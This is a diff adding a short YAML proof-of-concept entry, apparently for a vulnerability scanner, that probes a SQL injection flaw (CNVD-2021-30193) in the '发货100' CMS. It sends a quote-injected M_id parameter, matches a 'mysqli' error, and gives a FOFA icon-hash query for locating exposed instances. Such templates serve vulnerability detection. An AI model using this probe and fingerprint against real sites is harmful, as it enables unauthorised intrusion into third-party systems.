@@ -1,0 +1,11 @@
+type: GET
+resource: /?M_id=1%27&type=product
+head:
+  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+body: ""
+poc: mysqli
+fofa: icon_hash="1420424513"
+link:
+  - http://wiki.peiqi.tech/wiki/cms/%E5%8F%91%E8%B4%A7100/%E5%8F%91%E8%B4%A7100%20M_id%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-30193.html
+beizhu: 发货100 M_id SQL注入
